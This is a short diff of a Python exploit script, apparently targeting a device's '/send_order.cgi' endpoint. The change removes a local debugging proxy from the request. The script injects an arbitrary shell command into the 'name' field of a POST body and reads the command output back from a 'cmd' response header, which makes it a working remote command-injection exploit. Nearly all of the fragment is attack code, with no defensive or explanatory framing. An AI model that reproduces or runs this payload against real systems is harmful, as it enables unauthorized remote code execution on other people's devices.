@@ -82,14 +82,10 @@ def exp(target):
                 "Content-Type": "application/x-www-form-urlencoded"
             }
         data = '''{"opid":"1","name":";echo -n cmd:;%s;","type":"rest"}'''%(cmd)
-        proxies = {
-            'http': '127.0.0.1:8080',
-            'https': '127.0.0.1:8080'
-        }
         url = target + '/send_order.cgi?parameter=operation'
 
         try:
-            result = requests.post(url=url, data=data, verify=False, timeout=5, headers=headers,proxies=proxies, stream=True)
+            result = requests.post(url=url, data=data, verify=False, timeout=5, headers=headers,)
             response_sult = str(result.headers['cmd'])
             print(response_sult)
 
